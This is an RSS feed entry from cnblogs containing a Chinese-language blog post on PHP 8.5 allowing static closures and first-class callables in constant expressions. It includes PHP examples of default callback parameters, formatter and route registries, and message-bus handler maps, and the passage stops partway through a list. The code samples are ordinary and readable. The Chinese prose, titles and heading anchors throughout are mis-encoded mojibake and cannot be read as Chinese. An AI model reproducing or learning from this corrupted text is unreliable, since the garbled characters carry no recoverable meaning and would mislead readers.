<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-17T01:16:24.040Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19494966</link>
    <guid>962b83ae5f21dc695a162ffdf21a0698</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19494966" title="åå¸äº 2026-01-17 08:09">
    <span role="heading" aria-level="2">PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="php-85-é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼">PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</h1>
<h2 id="å½éç½®åæè¿è¡æ¶è¶æ°´ä»£ç ">å½"éç½®"åæè¿è¡æ¶è¶æ°´ä»£ç </h2>
<p>PHP éç½®ä¸ç´æä¸ªçç¾ï¼</p>
<ul>
<li>ä½ æ³è¦å£°æå¼éç½®ï¼ç®åçæ°ç»ãå¸¸éå¼ãå±æ§ã</li>
<li>ä½ä½ ä¹éè¦ä¸ç¹é»è¾ï¼"éªè¯è¿ä¸ªå­æ®µ"ã"éæ©è¿ä¸ªå¤çå¨"ã"æ ¼å¼åè¿ä¸ªå¼"ã"è¿æ»¤è¿ä¸ªåè¡¨"ã</li>
</ul>
<p>ä»¥åï¼ä¸æ¦ä½ éè¦å¨"éç½®ç±»"çå°æ¹å é»è¾ï¼å°±ä¼ç¢°å£ãPHP æææå¾å¤ç»æéå¶å¨å¸¸éè¡¨è¾¾å¼ââåºæ¬ä¸å°±æ¯ä¸å¯åçå¼ãå±æ§åæ°æ¯æææ¾çä¾å­ï¼ä½ å¯ä»¥æ¾æ´æ°ãå­ç¬¦ä¸²ãæ éæ°ç»â¦â¦ä½ä¸è½æ¾é­åã</p>
<p>æä»¥æä»¬ç¨åç§åéæ¹æ¡ï¼</p>
<ul>
<li>å­å­ç¬¦ä¸²å¦ <code>"App\\Handler::handle"</code>ï¼ç¶åç¨ <code>call_user_func</code> è°ç¨ã</li>
<li>å¨å±æ§éç¨"è¿·ä½ è¯­è¨"ï¼æ¯å¦è¡¨è¾¾å¼å­ç¬¦ä¸²ã</li>
<li>ç¨å¯ç©ºåè°ï¼å¨è¿è¡æ¶è®¾ç½®é»è®¤å¼ã</li>
<li>å¨å¼å¯¼æä»¶éå»ºæ³¨åè¡¨ï¼èä¸æ¯ç´æ¥å¨è¯¥æ¾çå°æ¹è¡¨è¾¾ã</li>
</ul>
<p>PHP 8.5 æ¹åäºè¿ä¸ªå±é¢ï¼éæé­ååä¸ç­å¯è°ç¨å¯¹è±¡ç°å¨å¯ä»¥åºç°å¨å¸¸éè¡¨è¾¾å¼ä¸­ï¼åæ¬ï¼</p>
<ul>
<li>å±æ§åæ°</li>
<li>å±æ§ååæ°çé»è®¤å¼</li>
<li>å¸¸éåç±»å¸¸é</li>
</ul>
<p>è¿å¬èµ·æ¥åç¼è¯å¨ç¹æ§ãå®éä¸æ¯ä¸ª"çæ´»è´¨é"åçº§ï¼è®©ä½ æéç½®æ¾å¨å®éç½®çä»£ç æè¾¹ï¼ä¸ç¨é­æ¯å­ç¬¦ä¸²æè¿è¡æ¶åå§å hackã</p>
<p>è¿ç¯æç« ä¼è®²"ä¸ºä»ä¹"ãå·ä½è§åï¼æéè¦éå¶ï¼ï¼ç¶åæ·±å¥å®éæ¨¡å¼ï¼è·¯ç±æ å°ãå¤çå¨æ³¨åè¡¨ãç­ç¥/æ ¼å¼åå¨æ³¨åè¡¨ãä¹ä¼è®²åªäºåºæ¯ä¸éåââå ä¸ºå¦æä¸å°å¿ï¼å¯è°ç¨éç½®ç¡®å®è½æåºä¸å¢ä¹±ã</p>
<p><a href="https://catchadmin.com/post/2026-01/php85-closures-callables-constant-expressions" target="_blank" rel="noopener nofollow">åæ PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</a></p>
<h2 id="æ§çç¹å¸¸éå¤ªåéé»è¾åªè½å¡è¿è¿è¡æ¶åå§å">æ§çç¹ï¼å¸¸éå¤ªåéï¼é»è¾åªè½å¡è¿è¿è¡æ¶åå§å</h2>
<p>PHP 8.5 ä¹åï¼éå¶ä¸æ¯ä½ ä¸è½åå»ºé­åââèæ¯ä½ ä¸è½å¨æäº"éç½®æ§½"éç¨å®ä»¬ã</p>
<p>ä¸ä¸ªå¸¸è§çç¹ï¼</p>
<h3 id="çç¹-aåè°é»è®¤å¼åæ°å¼ºå¶è¿è¡æ¶åå§å">çç¹ Aï¼"åè°é»è®¤å¼"åæ°å¼ºå¶è¿è¡æ¶åå§å</h3>
<p>å¦æä½ æ³åä¸ä¸ªæ¥åå¯éåè°çå½æ°ï¼å¹¶ä¸æ³è¦ä¸ä¸ªåççé»è®¤åè°ï¼éå¸¸è¿æ ·åï¼</p>
<pre><code class="language-php">function my_filter(array $items, ?Closure $predicate = null): array
{
    $predicate ??= static function ($v): bool { return !empty($v); };
    $out = [];
    foreach ($items as $item) {
        if ($predicate($item)) {
            $out[] = $item;
        }
    }
    return $out;
}
</code></pre>
<p>è¿è½ç¨â¦â¦ä½æ¯æ ·æ¿ä»£ç ï¼èä¸ä¸æ¯"å£°æå¼"çã</p>
<p>PHP 8.5 ç RFC æç¡®æå°è¿ä¸ªç¨ä¾ï¼åè®¸ç´æ¥å£°æé»è®¤åè°é­åï¼ä¸ç¨å¯ç©ºåæ°çåéæ¹æ¡ã</p>
<h3 id="çç¹-bå±æ§åæ°ä¸è½åå«çæ­£çé»è¾">çç¹ Bï¼å±æ§åæ°ä¸è½åå«çæ­£çé»è¾</h3>
<p>å±æ§æ¯è¡¨è¾¾è§åçèªç¶åºæï¼</p>
<ul>
<li>æææ£æ¥</li>
<li>éªè¯</li>
<li>åºååè¡ä¸º</li>
<li>æµè¯ç¨ä¾çæ</li>
</ul>
<p>ä½å±æ§åæ°åªè½æ¯å¸¸éè¡¨è¾¾å¼ï¼æä»¥äººä»¬ç¨å­ç¬¦ä¸²æè¡¨è¾¾å¼å¯¹è±¡ã</p>
<p>PHP 8.5 åå¸å¬åå±ç¤ºäºä¸ä¸ªå¸åç"ä¹å"æ¨¡å¼ï¼è®¿é®æ§å¶å±æ§æ¥åå­ç¬¦ä¸²è¡¨è¾¾å¼ãå¨ PHP 8.5 ä¸­ä½ å¯ä»¥ç´æ¥ä¼ éæé­åã</p>
<h3 id="çç¹-cæ³¨åè¡¨åè·¯ç±æ å°åæè¿è¡æ¶å¼å¯¼">çç¹ Cï¼æ³¨åè¡¨åè·¯ç±æ å°åæè¿è¡æ¶å¼å¯¼</h3>
<p>ä»»ä½æ¶åä½ æ³è¦ä»"é®"å°"å¤çå¨"çæ å°ï¼ä½ å¯è½å¨è¿è¡æ¶æå»ºå®ï¼</p>
<pre><code class="language-php">$handlers = [
    'json' =&gt; [JsonFormatter::class, 'format'],
    'text' =&gt; [TextFormatter::class, 'format'],
];
</code></pre>
<p>è¿è½ç¨ï¼ä½å¾èå¼±ï¼</p>
<ul>
<li>IDE éå½åéæä¸è½å¯é å°è·è¸ªå­ç¬¦ä¸²æ¹æ³åã</li>
<li>éæåææ´é¾çè§£ä»ä¹æ¯å¯è°ç¨çã</li>
<li>ä½ éè¦è¿è¡æ¶ä»£ç æ¥ç»è£æ¦å¿µä¸æ¯éæéç½®çä¸è¥¿ã</li>
</ul>
<p>PHP 8.5 çå¸¸éè¡¨è¾¾å¼æ¹è¿è®©ä½ å¯ä»¥æè¿äºæ³¨åè¡¨è¡¨è¾¾ä¸ºå¸¸éââå¹¶ä¸è®©å¤çå¨éæå®å¨ã</p>
<h2 id="ä»ä¹æ¯å¸¸éè¡¨è¾¾å¼ä¸ºä»ä¹éè¦">ä»ä¹æ¯å¸¸éè¡¨è¾¾å¼ï¼ä¸ºä»ä¹éè¦</h2>
<p>"å¸¸éè¡¨è¾¾å¼"æ¯ PHP åé¨æ¯è¯­ï¼æå¨å¿é¡»ä¸ä¾èµè¿è¡æ¶ç¶æå°±è½è®¡ç®çä¸ä¸æä¸­åè®¸çè¡¨è¾¾å¼ââå¯ä»¥çè§£ä¸º"ä¸å¯åå¼"ã</p>
<p>è¿äºä¸ä¸æåæ¬ï¼</p>
<ul>
<li>å±æ§åæ°</li>
<li>åæ°åå±æ§çé»è®¤å¼</li>
<li>ï¼ç±»ï¼å¸¸é</li>
</ul>
<p>é­å RFC æ»ç»æ§è§åä¸ºï¼å¸¸éè¡¨è¾¾å¼è¢«éå¶å¨å®éä¸æ¯"ä¸å¯åå¼"çæä½ï¼é­åä¸åæ¬å¨åââå°½ç®¡é­åæ¬è´¨ä¸æ¯ç¼è¯åçä»£ç ï¼æä½ç ï¼ï¼å¨çº¦æä¸å¯ä»¥è¢«è§ä¸ºä¸å¯åã</p>
<p>ä¸ºä»ä¹è¿å¾éè¦ï¼</p>
<p>å ä¸ºè¿äºä¸ä¸ææ¯ä½ æ³æ¾éç½®çå°æ¹ï¼</p>
<ul>
<li>å±æ§æ¯ä½ çåæ°æ®/éç½®å±ã</li>
<li>é»è®¤åæ°/å±æ§å¼è¡¨è¾¾é¢æè¡ä¸ºï¼ä¸éè¦æ ·æ¿ä»£ç ã</li>
<li>å¸¸éè¡¨è¾¾"è¿ä¸ªæ å°ä¸ä¼å"ã</li>
</ul>
<p>æ¢å¥è¯è¯´ï¼å¸¸éè¡¨è¾¾å¼æ¯ PHP å¼å¯¼ä½ èµ°åå£°æå¼ä»£ç çå°æ¹ãPHP 8.5 æ©å±äº"å£°æå¼"çå«ä¹ã</p>
<h2 id="å¸¸éä¸­çé­åå®å¨å¯è¯»çæ¨¡å¼åç¡¬æ§è§å">å¸¸éä¸­çé­åï¼å®å¨å¯è¯»çæ¨¡å¼ï¼åç¡¬æ§è§åï¼</h2>
<p>PHP 8.5 åè®¸å¸¸éè¡¨è¾¾å¼ä¸­çé­åââä½æä¸¥æ ¼çº¦æï¼</p>
<ul>
<li>å¿é¡»æ¯éæçï¼æ²¡æ <code>$this</code>ï¼ã</li>
<li>ä¸è½éè¿ <code>use(...)</code> æè·å¤é¨åéã</li>
<li>ç®­å¤´å½æ°å¨å¸¸éè¡¨è¾¾å¼ä¸­ä¸æ¯æï¼å ä¸ºå®ä»¬éå¼æè·åéã</li>
</ul>
<p>è¿äºè§åæ¯ç¼è¯æ¶å¼ºå¶çã</p>
<p>è¿å¬èµ·æ¥æéå¶ï¼ä½å®éä¸è¿æ­£æ¯è¿ä¸ªç¹æ§å®å¨çåå ï¼å®é²æ­¢æå¤æ"è¿è¡æ¶ç¶æ"å·æ¸¡è¿å¸¸éã</p>
<h3 id="é»è®¤åè°åæ°ä¸éè¦å¯ç©ºæ ·æ¿">é»è®¤åè°åæ°ï¼ä¸éè¦å¯ç©ºæ ·æ¿</h3>
<p>è¿æ¯ä¹åè¿æ»¤å¨ç¤ºä¾çå¹²å PHP 8.5 çæ¬ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

function my_filter(
    array $items,
    Closure $predicate = static function ($v): bool { return !empty($v); },
): array {
    $out = [];
    foreach ($items as $item) {
        if ($predicate($item)) {
            $out[] = $item;
        }
    }
    return $out;
}
</code></pre>
<p>è¿æ­£æ¯é­å RFC å¼ºè°çå¨æºï¼ä½ å¯ä»¥å£°æä¸ä¸ªçæ­£çé»è®¤åè°ï¼ä¸éè¦"å¯ç©º + è¿è¡æ¶é»è®¤"ã</p>
<p>å®éä¸ï¼è¿ä¹æ¹åäºå·¥å·æ¯æï¼</p>
<ul>
<li>åæ°æ­£ç¡®å°ç±»ååä¸º <code>Closure</code>ï¼ä¸æ¯ <code>?Closure</code></li>
<li>è°ç¨èä¸éè¦çæµ <code>null</code> æ¯å¦æç¹æ®å«ä¹</li>
<li>ä½ å»æäºä¸ä¸ªåæ¯åä¸è¡åå§ååªé³</li>
</ul>
<h3 id="åå«å¯è°ç¨è¡ä¸ºçç±»å¸¸é">åå«å¯è°ç¨è¡ä¸ºçç±»å¸¸é</h3>
<p>ä½ å¯ä»¥å¨å¸¸éæç±»å¸¸éä¸­å­å¨é­åï¼æå®ä»¬å½ä½"å¯è°ç¨éç½®"ã</p>
<p>ä¸ä¸ªç®åä¾å­ï¼æ ¼å¼åå¨æ³¨åè¡¨ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Formatters
{
    public const MAP = [
        'trim_lower' =&gt; static function (string $s): string {
            return strtolower(trim($s));
        },
        'digits_only' =&gt; static function (string $s): string {
            return preg_replace('/\D+/', '', $s) ?? '';
        },
    ];
}
</code></pre>
<p>ä½¿ç¨ï¼</p>
<pre><code class="language-php">$input = "  +62 (812) 345-678  ";
$normalized = (Formatters::MAP['digits_only'])($input);
</code></pre>
<p>è¿è¯»èµ·æ¥åéç½®ï¼ä½ä¸æ¯"å­ç¬¦ä¸²ç±»å"ãå®æ¯çæ­£ç PHPï¼ç¼è¯è¿çï¼æç±»åçï¼å¯éæçã</p>
<h3 id="å±æ§é»è®¤å¼å¯è°ç¨è¡ä¸ºä½ä¸ºé»è®¤ç­ç¥">å±æ§é»è®¤å¼ï¼å¯è°ç¨è¡ä¸ºä½ä¸ºé»è®¤ç­ç¥</h3>
<p>å ä¸ºå¸¸éè¡¨è¾¾å¼ä¸­çé­åå¯ä»¥ç¨ä½å±æ§é»è®¤å¼ï¼ä½ å¯ä»¥å¨å±æ§å£°æå¤å®ä¹é»è®¤ç­ç¥ââåæ ·ä¸éè¦è¿è¡æ¶åå§åã</p>
<p>ä¾å­ï¼å¯éç½®çè§èåå¨ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Normalizer
{
    public Closure $normalize = static function (string $s): string {
        return trim($s);
    };

    public function run(string $value): string
    {
        return ($this-&gt;normalize)($value);
    }
}
</code></pre>
<p><strong>éè¦ç»è</strong>ï¼å¸¸éè¡¨è¾¾å¼ä¸­çé­åå¿é¡»æ¯éæçï¼è¿æå³çé­åæ¬èº«ä¸è½ç¨ <code>$this</code>ã</p>
<p>è¿æ¯ææçæè¡¡ï¼å¸¸éè¡¨è¾¾å¼åªæ±å¼ä¸æ¬¡ï¼è <code>$this</code> åªæå¨é­åä¸ºæ¯ä¸ªå¯¹è±¡å®ä¾éæ°åå»ºæ¶æææä¹ï¼è¿ä¸æ¯å¸¸éè¡¨è¾¾å¼çè¡ä¸ºæ¹å¼ï¼ã</p>
<h3 id="ä½ç¨åé­åå¨æ­£ç¡®çä¸ä¸æä¸­ä»ç¶è½çå°ç§ææå">ä½ç¨åï¼é­åå¨æ­£ç¡®çä¸ä¸æä¸­ä»ç¶è½çå°ç§ææå</h3>
<p>å°½ç®¡é­åå¿é¡»æ¯éæçï¼æ²¡æ <code>$this</code>ï¼ï¼å¨è¿äºå¸¸éä¸ä¸æä¸­åå»ºçé­åä»ç¶éµå¾ªæ­£å¸¸çä½ç¨åè§åãRFC è¯´æï¼</p>
<ul>
<li>å±æ§é»è®¤å¼ä¸­çé­åå¯ä»¥è®¿é®æå¨ç±»çç§æå±æ§/æ¹æ³/å¸¸é</li>
<li>å±æ§åæ°ä¸­çé­åå¯ä»¥è®¿é®æå¨ç±»çç§ææå</li>
</ul>
<p>è¿å¯ç¨äºä¸ä¸ªå¥½æ¨¡å¼ï¼æå¤æé»è¾æ¾å¨ç§æéæè¾å©æ¹æ³ä¸­ï¼æé­åä½ä¸ºéç½®æ´é²åºæ¥ã</p>
<h2 id="å¸¸éä¸­çä¸ç­å¯è°ç¨å¯¹è±¡éæå®å¨çå¼ç¨ä¸ç¨å­ç¬¦ä¸²">å¸¸éä¸­çä¸ç­å¯è°ç¨å¯¹è±¡ï¼éæå®å¨çå¼ç¨ï¼ä¸ç¨å­ç¬¦ä¸²</h2>
<p>é­åéå"åèé»è¾"ãä½ææ¶åä½ ä¸æ³è¦åèé»è¾ââä½ æ³æåä¸ä¸ªç°æçå½æ°æéææ¹æ³ã</p>
<p>è¿å°±æ¯ä¸ç­å¯è°ç¨å¯¹è±¡ï¼FCCï¼çç¨æ­¦ä¹å°ã</p>
<p>ä¸ç­å¯è°ç¨å¯¹è±¡çèµ·æ¥åï¼</p>
<pre><code class="language-php">strrev(...)
MyClass::myMethod(...)
</code></pre>
<p>å®ä»¬äº§çä¸ä¸ªè½¬åå°å½æ°/æ¹æ³ç <code>Closure</code>ã</p>
<p>PHP 8.5 ç°å¨åè®¸å¸¸éè¡¨è¾¾å¼ä¸­ç FCC è¯­æ³ï¼æ¨å¨"å®å"å¸¸éä¸­é­åçç¹æ§ã</p>
<h3 id="ä¸ºä»ä¹-fcc-æ¯å­ç¬¦ä¸²å¯è°ç¨æ´å¥½">ä¸ºä»ä¹ FCC æ¯å­ç¬¦ä¸²å¯è°ç¨æ´å¥½</h3>
<p>æ¯è¾è¿ä¸¤ä¸ªï¼</p>
<pre><code class="language-php">// æ§æ¹å¼
public const HANDLERS = [
    'reverse' =&gt; 'strrev',
    'slug' =&gt; 'App\\Slugger::slugify',
];
</code></pre>
<p>å¯¹æ¯ï¼</p>
<pre><code class="language-php">// PHP 8.5
public const HANDLERS = [
    'reverse' =&gt; strrev(...),
    'slug' =&gt; Slugger::slugify(...),
];
</code></pre>
<p>ç¬¬äºä¸ªçæ¬æ´å¥½ï¼å ä¸ºï¼</p>
<ul>
<li>å¯éæï¼éå½ååç§»å¨æ´å¯é </li>
<li>éæåæå¯ä»¥çè§£å®æ¯å¯è°ç¨ç</li>
<li>ä½ é¿åäºé­æ¯å­ç¬¦ä¸²åè¿è¡æ¶å¯è°ç¨è§£æ</li>
</ul>
<h3 id="å¸¸éè¡¨è¾¾å¼ä¸­-fcc-ççº¦æ">å¸¸éè¡¨è¾¾å¼ä¸­ FCC ççº¦æ</h3>
<p>FCC RFC æ·»å äºä¸äºéè¦éå¶ï¼é¤äºæ­£å¸¸ç FCC è§åï¼ï¼</p>
<ul>
<li>åªæ¯æç¬ç«å½æ°åéææ¹æ³ï¼<code>::</code>ï¼ã</li>
<li>åªæ¯æ <code>function_name(...)</code> å <code>ClassName::methodName(...)</code> è¯­æ³ã</li>
<li>ä½ ä¸è½ç¨è¡¨è¾¾å¼æå»ºåç§°ï¼<code>($fn)(...)</code>ï¼ãæ°ç»ï¼<code>[ClassName::class, 'method'](...)</code>ï¼ï¼æä¾èµ <code>__callStatic()</code> é­æ¯æ¹æ³ã</li>
</ul>
<p>è¿æ¯å¥½äºï¼å®è®©å¸¸éè¡¨è¾¾å¼ä¸­ç FCC ç¨æ³æ¸æ°ä¸å¯åæã</p>
<h2 id="å®éç¨ä¾">å®éç¨ä¾</h2>
<h3 id="ç¨ä¾è·¯ç±æ å°ä½ä¸ºå¸¸é">ç¨ä¾ï¼è·¯ç±æ å°ä½ä¸ºå¸¸é</h3>
<p>ä¼ ç»æ¹å¼ï¼è·¯ç±æ å°æ¯è¿è¡æ¶æå»ºçï¼</p>
<pre><code class="language-php">$routes = [
    'GET /health' =&gt; [HealthController::class, 'check'],
    'GET /posts'  =&gt; [PostsController::class, 'index'],
];
</code></pre>
<p>è¿è½ç¨ï¼ä½ä¸æ¯éæå®å¨çã</p>
<p>å¨ PHP 8.5 ä¸­ä½ å¯ä»¥ç¨ FCC æéæé­åå®ä¹è·¯ç±æ å°ï¼ä½ä¸ºå¸¸éï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Routes
{
    public const MAP = [
        'GET /health' =&gt; HealthController::check(...),
        'GET /posts'  =&gt; PostsController::index(...),
        // å¿«éç«¯ç¹çåèå¤çå¨
        'GET /version' =&gt; static function (Request $req): Response {
            return Response::text('ok');
        },
    ];
}
</code></pre>
<p>ç°å¨ä½ å¯ä»¥å®ç°ä¸ä¸ªç®åçååå¨ï¼</p>
<pre><code class="language-php">final class Dispatcher
{
    public function dispatch(Request $req): Response
    {
        $key = $req-&gt;method . ' ' . $req-&gt;path;
        $handler = Routes::MAP[$key] ?? null;
        if ($handler === null) {
            return Response::text('Not found', 404);
        }
        return $handler($req);
    }
}
</code></pre>
<p>è¿ä¸ªæ¨¡å¼æå ä¸ªå¥½å¤ï¼</p>
<ul>
<li>è·¯ç±æ å°æ¯çæ­£çå¸¸ééç½®ã</li>
<li>å¤çå¨æ¯çæ­£çå¯è°ç¨å¯¹è±¡ï¼ä¸æ¯å­ç¬¦ä¸²ã</li>
<li>éææ´å®å¨ï¼ç¹å«æ¯éææ¹æ³å¤çå¨ï¼ã</li>
</ul>
<p>å®éçè·¯ç±å¨éè¦è·¯å¾åæ°ï¼ä½å³ä½¿è¿æ ·ï¼"å¤çå¨æ³¨åè¡¨"é¨åéå¸¸ä¿æéæã</p>
<h3 id="ç¨ä¾æ¶æ¯æ»çº¿çå¤çå¨æ³¨åè¡¨">ç¨ä¾ï¼æ¶æ¯æ»çº¿çå¤çå¨æ³¨åè¡¨</h3>
<p>æ³è±¡ä¸ä¸ªç®åçæ¶æ¯æ»çº¿ï¼æ¶æ¯ç±»æ å°å°å¤çå¨ã</p>
<p>æ§æ¹å¼ï¼</p>
<pre><code class="language-php">$handlers = [
    UserRegistered::class =&gt; 'App\\Handlers\\SendWelcomeEmail::handle',
];
</code></pre>
<p>ç°å¨ï¼ç¨ PHP 8.5 FCCï¼</p>
<pre><code class="language-php">final class MessageHandlers
{
    public const MAP = [
        UserRegistered::class =&gt; SendWelcomeEmail::handle(...),
        OrderPaid::class      =&gt; CreateInvoice::handle(...),
    ];
}
</code></pre>
<p>ååå¨ï¼</p>
<pre><code class="language-php">final class Bus
{
    public function __construct(private Container $container) {}

    public function handle(object $message): void
    {
        $handler = MessageHandlers::MAP[$message::class] ?? null;
        if ($handler === null) {
            throw new RuntimeException('No handler registered for ' . $message::class);
        }
        // å¦æå¤çå¨æ¯éæçï¼å®ä»¬å¯ä»¥æ¾å¼æ¥åä¾èµï¼
        // æèä½ å¯ä»¥è°æ´è¿ä¸ªæ¨¡å¼ï¼è§ä¸é¢ç DI è¯´æï¼ã
        $handler($message, $this-&gt;container);
    }
}
</code></pre>
<p>å³é®æ¦å¿µï¼å¸¸éè¡¨è¾¾å¼è®©ä½ ææ å°ä¿æå¨å¸¸éä¸­ï¼ä½ä½ ä»ç¶æ§å¶ä¾èµå¦ä½æ³¨å¥ââéè¿ç­¾åè®¾è®¡ã</p>
<h3 id="ç¨ä¾ç­ç¥æ ¼å¼åå¨æ³¨åè¡¨switch-è¯­å¥çå¹²åæ¿ä»£">ç¨ä¾ï¼ç­ç¥/æ ¼å¼åå¨æ³¨åè¡¨ï¼switch è¯­å¥çå¹²åæ¿ä»£ï¼</h3>
<p>è¿æ¯ææåæ¬¢çå®éç¨éï¼æ¿æ¢ä¸ä¸ªä¸æ­å¢é¿ç switchã</p>
<pre><code class="language-php">function format(string $type, mixed $value): string
{
    return match ($type) {
        'json' =&gt; json_encode($value),
        'text' =&gt; (string) $value,
        'upper' =&gt; strtoupper((string) $value),
        default =&gt; throw new InvalidArgumentException('Unknown formatter'),
    };
}
</code></pre>
<p>ç°å¨æ³è±¡è¿å¢é¿å° 15-30 ä¸ªç­ç¥ãä½ æç»å¾å°ä¸ä¸ªå¤§ match åä¸ä¸ª diff ç£éã</p>
<p>ç¨å¯è°ç¨å¸¸éï¼</p>
<pre><code class="language-php">final class FormatterRegistry
{
    public const FORMATTERS = [
        'json' =&gt; static function (mixed $v): string {
            return json_encode($v, JSON_THROW_ON_ERROR);
        },
        'text' =&gt; static function (mixed $v): string {
            return (string) $v;
        },
        // FCC å°åçå½æ°
        'reverse' =&gt; strrev(...),
    ];

    public static function format(string $type, mixed $value): string
    {
        $fn = self::FORMATTERS[$type] ?? null;
        if ($fn === null) {
            throw new InvalidArgumentException("Unknown formatter: {$type}");
        }
        return $fn($value);
    }
}
</code></pre>
<p>ç°å¨æ·»å ç­ç¥åªéè¦æ¹ä¸è¡ã</p>
<h2 id="æµè¯åä¾èµæ³¨å¥ä»ä¹è¯¥æ¾å¸¸éä»ä¹è¯¥æ¾å®¹å¨">æµè¯åä¾èµæ³¨å¥ï¼ä»ä¹è¯¥æ¾å¸¸éï¼ä»ä¹è¯¥æ¾å®¹å¨</h2>
<p>è¿ä¸ªç¹æ§å¼å¯¼ä½ èµ°å"ä»£ç å³éç½®"ãè¿å¾å¥½ââç´å°ä½ å¼å§æè¿è¡æ¶ç¶ææ³¨å¥å°åºè¯¥æ¯éæçä¸è¥¿éã</p>
<p>ä¸ä¸ªå¥½çå¿æºæ¨¡åï¼</p>
<ul>
<li><strong>å¸¸éåºè¯¥åå«ç¨³å®çæ¥çº¿</strong>ï¼æ å°ãç­ç¥ãä¸ä¾èµè¿è¡æ¶ç¶æçå°é»è¾çæ®µã</li>
<li><strong>DI å®¹å¨åºè¯¥åå«è¿è¡æ¶ç»è£</strong>ï¼éè¦ç¯å¢ç¸å³æ¥çº¿çå¯¹è±¡ãIO èµæºãå­è¯ãè¿æ¥ç­ã</li>
</ul>
<h3 id="å¥½çå¸¸éå¯è°ç¨ç¨æ³çº¯ç²¹çè½¬æ¢åç­ç¥">å¥½çå¸¸éå¯è°ç¨ç¨æ³ï¼çº¯ç²¹çè½¬æ¢åç­ç¥</h3>
<p>è¿äºå¨å¸¸éè¡¨è¾¾å¼ä¸­æ¯å®å¨çï¼</p>
<ul>
<li>è§èåå½æ°ï¼trimãcanonicalizeï¼</li>
<li>è·¯ç±/ååéæ©é»è¾</li>
<li>åªä¾èµè¾å¥å¼çéªè¯å¨</li>
<li>æ ¼å¼åå¨åæ å°å¨</li>
</ul>
<h3 id="di-çç¨æ­¦ä¹å°å½ä½ éè¦ä¾èµæ¶">DI çç¨æ­¦ä¹å°ï¼å½ä½ éè¦ä¾èµæ¶</h3>
<p>ä½ ä»ç¶å¯ä»¥éè¿è®¾è®¡å¯è°ç¨å¯¹è±¡æ¾å¼æ¥åä¾èµæ¥æ··åå¯è°ç¨éç½®å DIã</p>
<p>ä¾å­ï¼æ³¨åè¡¨è¿åä¸ä¸ªæ¥å <code>(Message $m, Container $c)</code> çå¯è°ç¨å¯¹è±¡ï¼</p>
<pre><code class="language-php">final class Handlers
{
    public const MAP = [
        UserRegistered::class =&gt; static function (UserRegistered $m, Container $c): void {
            $mailer = $c-&gt;get(Mailer::class);
            $mailer-&gt;sendWelcome($m-&gt;email);
        },
    ];
}
</code></pre>
<p>è¿ä¿æå¨çº¦æåï¼å ä¸ºé­åæ¯éæçä¸ä¸æè·ç¶æã"ä¾èµè§£æ"å¨è°ç¨æ¶åçï¼å®¹å¨è¢«ä¼ å¥ã</p>
<p>è¿æ»æ¯çæ³çåï¼ä¸æ¯ãä½å®æ¯ä¸ä¸ªå¹²åãæ¾å¼çæ¡¥æ¢ã</p>
<h3 id="æµè¯å½±åæ´å¥½çé»è®¤å¼æ´å®¹æè¦ç">æµè¯å½±åï¼æ´å¥½çé»è®¤å¼ï¼æ´å®¹æè¦ç</h3>
<p>å¸¸éè¡¨è¾¾å¼é­åè®©é»è®¤å¼æ´å¹²åï¼</p>
<ul>
<li>å½æ°å¯ä»¥æé»è®¤é­ååæ°ï¼ä¸ç¨å¯ç©ºï¼ã</li>
<li>å±æ§å¯ä»¥æé»è®¤é­åç­ç¥ã</li>
</ul>
<p>å¯¹äºæµè¯ï¼ä½ ä»ç¶å¯ä»¥éè¿ä¼ éä¸åçé­ååæ°æç»å¯¹è±¡å±æ§èµå¼ä¸åçç­ç¥æ¥è¦çè¡ä¸ºï¼å¦æè¯¥å±æ§è®¾è®¡ä¸æ¯å¯åçï¼ãä¸»è¦æ¹è¿æ¯é»è®¤è¡ä¸ºå¨å®è¯¥å¨çå°æ¹è¡¨è¾¾ï¼ä½ ä¸éè¦è¿è¡æ¶åå§åè¶æ°´ä»£ç æ¥åå»ºé»è®¤é­åã</p>
<h2 id="é·é±æè·ç¶æå¯ä½ç¨åå¢éå¯è¯»æ§">é·é±ï¼æè·ç¶æãå¯ä½ç¨åå¢éå¯è¯»æ§</h2>
<p>è¿ä¸ªç¹æ§ç»ä½ å¨"éç½®ä¸ä¸æ"ä¸­æ´å¤è½åãè½åå¸¦æ¥æ°çæ¬èµ·ç³å¤´ç ¸èªå·±èçæ¹å¼ã</p>
<h3 id="é·é±-aè¯å¾æè·ç¶æä¸ä¼ç¼è¯è¿æ¯å¥½äº">é·é± Aï¼è¯å¾æè·ç¶æï¼ä¸ä¼ç¼è¯ââè¿æ¯å¥½äºï¼</h3>
<p>ä½ ä¸è½è¿æ ·åï¼</p>
<pre><code class="language-php">$prefix = "prod_";
const FN = static function (string $s) use ($prefix): string {
    return $prefix . $s;
};
</code></pre>
<p>å¸¸éè¡¨è¾¾å¼ä¸­çé­åä¸è½éè¿ <code>use(...)</code> æè·åéã</p>
<p>è¿æ¯ç¡¬æ§çº¦æï¼å®å¼ºè¿«ä½ éç¨æ´å¥½çè®¾è®¡ï¼</p>
<ul>
<li>æå¼ä½ä¸ºåæ°ä¼ é</li>
